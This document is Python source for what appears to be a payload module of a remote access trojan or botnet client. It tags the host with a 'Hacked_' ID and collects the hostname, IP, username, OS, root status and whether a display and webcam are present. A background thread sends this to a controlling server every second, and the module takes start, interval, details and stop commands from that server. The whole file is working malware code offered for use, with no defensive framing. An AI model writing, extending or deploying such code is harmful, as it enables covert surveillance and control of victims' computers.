from lib.tool import EZData

#[THE CODE ABOVE WILL NOT BE INCLUDED IN PAYLOAD]

import socket
import getpass
import platform
import uuid
import os

import time
import json
import threading

g_Info = None
g_thread = None

class Info:
    def __init__(self):
        self.szID = f'Hacked_{uuid.getnode()}'
        self.szHostname = socket.gethostname()
        self.szIP = socket.gethostbyname(socket.gethostname())
        self.szUsername = getpass.getuser()
        self.szOSversion = platform.platform()
        self.szUid = str(os.getuid())
        self.bAdmin = self.szUid == '0'

        self.nSendInfoInterval = 1 # second.

    def get_cpu_usage(self) -> int:
        try:
            def read_cpu_times() -> tuple[str, str]:
                with open('/proc/stat', 'r') as f:
                    cpu_line = f.readline()
                
                values = list(map(int, cpu_line.split()[1:]))
                total = sum(values)
                idle = values[3]

                return total, idle

            total1, idle1 = read_cpu_times()
            time.sleep(0.1) 
            total2, idle2 = read_cpu_times()

            total_delta = total2 - total1
            idle_delta = idle2 - idle1

            usage = 100 * (1 - idle_delta / total_delta) if total_delta else 0
            
            return round(usage, 2)
        except:
            return -1
    
    def exists_monitor(self) -> bool:
        return 'DISPLAY' in os.environ or 'WAYLAND_DISPLAY' in os.environ
    
    def exists_webcam(self) -> bool:
        for i in range(5): # Check up to /dev/video4
            if os.path.exists(f"/dev/video{i}"):
                return True
        return False

    def get_info(self) -> dict:
        dic_info = {
            'ID': self.szID,
            'IP': self.szIP,
            'Hostname': self.szHostname,
            'Username': self.szUsername,
            'OS': self.szOSversion,
            'uid': self.szUid,
            'admin': self.bAdmin,
            'Monitor': self.exists_monitor(),
            'Webcam': self.exists_webcam(),
            'CPU': f'{self.get_cpu_usage()} %'
        }

        return dic_info

    def send_info(self, clnt: object):
        while True:
            info = self.get_info()
            json_str = json.dumps(info)

            ls_send = [
                '*', # boardcast
                'info',
                'start',
                json_str,
            ]

            clnt.sendserver(ls_send)

            time.sleep(self.nSendInfoInterval)

    def get_details(self) -> list:
        ls = [

            # Basic information.
            self.get_info(),

            # System information.
            {
                'System': platform.system(),
                'Node Name': platform.node(),
                'Release': platform.release(),
                'Version': platform.version(),
                'Machine': platform.machine(),
                'Processor': platform.processor(),
            },

            # Client informaiton.
            {
                'Send infor interval': self.nSendInfoInterval,
                'Loaded class': ','.join([x for x in self.clnt.dic_class.keys()])
            },
        ]

        return ls

    def run(self, clnt: object, szToken: str, aMsg: list) -> list:
        global g_Info
        global g_thread

        try:
            if aMsg[0] == 'start':
                if g_thread != None or g_Info != None:
                    return None
                
                self.clnt = clnt

                g_thread = threading.Thread(target=self.send_info, args=[clnt, ])
                g_thread.daemon = True
                g_thread.start()
            
                return None
            elif aMsg[0] == 'interval':
                if aMsg[1] == 'set':
                    nInterval = int(aMsg[3]) # seconds.
                    g_Info.nSendInfoInterval = nInterval
                    self.nSendInfoInterval = nInterval

            elif aMsg[0] == 'details':

                ls_msg = [
                    'info',
                    'details',
                    EZData.lsDic2Str(self.get_details()),
                ]

                return ls_msg
            elif aMsg[0] == 'stop':
                g_Info = g_thread = None
                return [
                    'stop',
                    '1',
                ]
            
        except Exception as ex:
            print(ex)

if __name__ == '__main__':
    pass